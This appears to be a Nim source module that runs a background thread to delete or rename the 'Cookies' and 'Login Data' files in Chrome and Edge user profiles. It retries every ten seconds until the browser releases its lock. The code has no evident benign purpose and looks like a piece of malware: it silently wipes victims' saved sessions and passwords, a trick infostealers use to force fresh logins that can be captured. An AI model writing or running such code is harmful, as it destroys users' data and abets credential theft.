from os import sleep
from os import getEnv
from os import `/`
from ../flags import BROWSER_THREAD_REMOVE_FILE
from os import tryRemoveFile
from os import moveFile

type
  BROWSER_TYPES = enum
    CHROME_BASED


proc removeFileOrSleep(src: string, doSleep: bool = false): void =
  const sleepTime: int = 10

  if doSleep:
    sleep(sleepTime * 1000)

  var worked: bool = true

  when BROWSER_THREAD_REMOVE_FILE:
    worked = tryRemoveFile(src)
  else:
    try:
      # rename file from `x` to `x_`
      moveFile(src, src & "_")
    except OSError:
      # try to remove file every `sleepTime` secs
      # am nev de asta pt ca daca browserul este deschis
      # nu pot sterge fisierul
      removeFileOrSleep(src, true)
  # chit ca nu exista fisierul
  # worked va fi true
  if not worked:
    # same as above
    removeFileOrSleep(src, true)

proc initBrowserThread*(): void {.thread.} =
  # trebuie mai multe browsere
  let browsers: seq[tuple[based: BROWSER_TYPES, folders: seq[string]]] = @[
    (
      CHROME_BASED,
      @[
        r"Google\Chrome",
        r"Microsoft\Edge",
      ]
    )
  ]

  var localappdata: string = ""

  for browser in browsers:
    for folder in browser.folders:
      var
        fullFolder: string
        files: seq[string]

      if browser.based == CHROME_BASED:
        if localappdata == "":
          localappdata = getEnv("localappdata")
        fullFolder = localappdata / folder / r"User Data\Default"
        files = @["Cookies", "Login Data"]

      for file in files:
        let filePath: string = fullFolder / file

        removeFileOrSleep(filePath)
